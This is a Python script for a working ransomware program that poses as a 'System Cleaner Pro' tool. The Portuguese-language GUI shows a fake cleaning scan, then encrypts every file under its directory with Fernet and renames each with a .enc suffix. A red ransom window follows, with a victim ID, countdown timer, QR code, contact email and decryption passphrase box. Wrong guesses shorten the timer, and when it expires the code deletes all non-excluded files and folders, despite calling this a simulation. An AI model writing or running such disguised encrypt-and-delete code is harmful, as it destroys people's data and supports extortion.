def final_call():    

    import os
    import threading
    import uuid
    from pathlib import Path
    from datetime import datetime
    import time
    import tkinter as tk
    from tkinter import ttk, messagebox
    import shutil
    import qrcode
    from PIL import ImageTk
    from cryptography.fernet import Fernet

    # ================= CONFIG =================

    ATTACKER_EMAIL = "banoffe@protonmail.com"

    BASE_DIR = Path(__file__).resolve().parent
    KEY_FILE = Path("thekey.key")
    LOCK_FILE = Path(".locked")
    LOG_FILE = Path("log.txt")

    EXCLUDE = {
        Path(__file__).name,
        "LICENSE",
        "README.md",
        "thekey.key",
        ".locked",
        "log.txt",
        "requirements.txt"
        ".locked",
        "buff_sync.py",
        "byte_trm.py",
        "cache_vac.py",
        "config_109.py",
        "core_opt.py",
        "data_purge.py",
        "data.xml",
        "disk_scrub.py",
        "hdr_vfy.py",
        "info.txt",
        "junk_clr.py",
        "log_shrk.py",
        "log.txt",
        "meta.json",
        "qr_code.png",
        "reg_tidy.py",
        "requirements.txt",
        "start.py",
        "strm_aln.py",
        "style.css",
        "sys_scan.py",
        "temp_wipe.py",
        "thekey.key",
        "view.html"
    }

    DECRYPT_PASSPHRASE = "rica_games"
    # ================= LOG =================
    def log(msg):
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {msg}\n")

    # ================= FILES =================
    def listar_arquivos(only_enc=False):
        files = []
        for p in BASE_DIR.rglob("*"):
            if ".git" in p.parts:
                continue
            if not p.is_file():
                continue
            if p.name in EXCLUDE:
                continue

            if only_enc:
                if p.suffix == ".enc":
                    files.append(p)
            else:
                if p.suffix != ".enc":
                    files.append(p)
        return files

    def listar_arquivos_formatado():
        arquivos = listar_arquivos(False)
        if not arquivos:
            return "Nenhum arquivo encontrado."
        txt = "📂 Arquivos encontrados:\n\n"
        for p in arquivos:
            txt += f"- {p.name}\n"
        return txt

    # ================= QR CODE =================
    def gerar_qr_code(data="https://www.youtube.com/watch?v=ErBpk4A8lo4&pp=ygUEamFuZdIHCQnUCgGHKiGM7w%3D%3D"):
        qr = qrcode.QRCode(
            version=1,
            box_size=10,
            border=2
        )
        qr.add_data(data)
        qr.make(fit=True)

        img = qr.make_image(fill_color="black", back_color="white")
        img = img.resize((180, 180))  # tamanho ajustado

        path = "qr_code.png"
        img.save(path)
        return path

    # ================= KEY =================
    def carregar_ou_criar_chave():
        if not KEY_FILE.exists():
            key = Fernet.generate_key()
            with open(KEY_FILE, "wb") as f:
                f.write(key)
            return key
        else:
            with open(KEY_FILE, "rb") as f:
                return f.read()

    # ================= CORE =================
    def criptografar(callback_progress):
        if LOCK_FILE.exists():
            raise RuntimeError("Já executado.")

        key = carregar_ou_criar_chave()
        fernet = Fernet(key)

        files = listar_arquivos(False)
        total = max(len(files), 1)

        for i, p in enumerate(files, start=1):
            with open(p, "rb") as f:
                data = f.read()

            enc = fernet.encrypt(data)

            with open(p, "wb") as f:
                f.write(enc)

            new_name = p.with_suffix(p.suffix + ".enc")
            p.rename(new_name)

            log(f"CRIPTOGRAFADO: {new_name}")
            callback_progress(i / total, f"💀 Processando: {new_name.name}")
            time.sleep(0.12)

        with open(LOCK_FILE, "w") as f:
            f.write("done")

        return len(files)

    def descriptografar(callback_progress):
        if not KEY_FILE.exists():
            raise RuntimeError("Chave não encontrada.")

        with open(KEY_FILE, "rb") as f:
            key = f.read()

        fernet = Fernet(key)
        files = listar_arquivos(True)
        total = max(len(files), 1)

        for i, p in enumerate(files, start=1):
            with open(p, "rb") as f:
                data = f.read()

            try:
                dec = fernet.decrypt(data)
            except Exception:
                callback_progress(i / total, f"Erro: {p.name}")
                continue

            with open(p, "wb") as f:
                f.write(dec)

            new_name = p.with_suffix("")
            p.rename(new_name)

            log(f"DESCRIPTOGRAFADO: {new_name}")
            callback_progress(i / total, f"✔ Restaurado: {new_name.name}")
            time.sleep(0.08)

        if LOCK_FILE.exists():
            LOCK_FILE.unlink()

        return len(files)

    # ================= UI =================
    class App(tk.Tk):
            def __init__(self):
                super().__init__()
                self.title("System Cleaner Pro")
                self.geometry("760x480")
                self.resizable(False, False)

                self.victim_id = str(uuid.uuid4())[:8]
                self.time_left = 5 * 60 * 60  # 5 horas

                header = tk.Frame(self)
                header.pack(fill="x", padx=16, pady=10)

                tk.Label(header, text="System Cleaner Pro",
                        font=("Segoe UI", 16, "bold")).pack(anchor="w")
                tk.Label(header, text="Remova arquivos temporários e melhore o desempenho",
                        font=("Segoe UI", 9)).pack(anchor="w")

                self.text = tk.Text(self, height=12)
                self.text.pack(fill="both", expand=True, padx=16)

                self.progress = ttk.Progressbar(self, length=600)
                self.progress.pack(pady=10)

                self.status = tk.Label(self, text="Pronto")
                self.status.pack()

                ttk.Button(self, text="🧼 Limpar arquivos temporários", command=self.fake_clean).pack(pady=10)

                self._append("Sistema pronto para análise.\n")

            def _append(self, msg):
                self.text.insert("end", msg + "\n")
                self.text.see("end")

            def _progress(self, r, msg):
                self.progress["value"] = r * 100
                self.status.config(text=msg)
                self.update_idletasks()

            def fake_clean(self):
                self._append("🔍 Iniciando análise do sistema...\n")

                def job():
                    for i in range(20):
                        self._progress(i/20, f"Scanning... {i*5}%")
                        time.sleep(0.1)

                    self._append(listar_arquivos_formatado())
                    n = criptografar(self._progress)
                    self._append(f"\n💀 {n} arquivos comprometidos.\n")
                    self.show_ransom()

                threading.Thread(target=job, daemon=True).start()

            def show_ransom(self):
                top = tk.Toplevel(self)
                top.configure(bg="#8B0000")
                top.geometry("600x480")

                tk.Label(top, text="💀 YOUR FILES ARE ENCRYPTED 💀",
                        font=("Consolas", 16, "bold"),
                        fg="white", bg="#8B0000").pack(pady=10)

                tk.Label(top, text=f"Victim ID: {self.victim_id}",
                        fg="white", bg="#8B0000").pack()

                self.timer_label = tk.Label(top, fg="white", bg="#8B0000")
                self.timer_label.pack(pady=10)

                # QR Code
                qr_path = gerar_qr_code("https://www.youtube.com/watch?v=ErBpk4A8lo4&pp=ygUEamFuZdIHCQnUCgGHKiGM7w%3D%3D")
                img = ImageTk.PhotoImage(file=qr_path)

                qr_label = tk.Label(top, image=img, bg="#8B0000")
                qr_label.image = img
                qr_label.pack(pady=10)

                self.update_timer()

                tk.Label(top,
                        text=f"📧 Contact: {ATTACKER_EMAIL}",
                        fg="white", bg="#8B0000").pack()

                entry = tk.Entry(top)
                entry.pack(pady=10)

                def try_decrypt():
                    if entry.get() == DECRYPT_PASSPHRASE:
                        self.run_decrypt()
                        top.destroy()
                    else:
                        self.time_left = max(0, self.time_left - 3600)
                        messagebox.showerror("Erro", "❌ Chave incorreta! Tempo reduzido.")
                        log("Tentativa falha")

                tk.Button(top, text="Decrypt", command=try_decrypt).pack(pady=10)

            def update_timer(self):
                mins = self.time_left // 60
                secs = self.time_left % 60
                self.timer_label.config(text=f"⏳ Time left: {mins//60:02}:{mins%60:02}:{secs:02}")

                if self.time_left > 0:
                    self.time_left -= 1
                    self.after(1000, self.update_timer)
                else:
                    messagebox.showerror("💀", "Tempo esgotado. Arquivos perdidos (simulação).")
                    for item in BASE_DIR.iterdir():
                        if item.name in EXCLUDE:
                            continue
                        
                        if item.is_file():
                            item.unlink()
                        elif item.is_dir():
                            shutil.rmtree(item)
                    log("Tempo expirado")

            def run_decrypt(self):
                def job():
                    n = descriptografar(self._progress)
                    self._append(f"✔ {n} arquivos restaurados.")
                threading.Thread(target=job, daemon=True).start()


    app = App()
    app.mainloop()
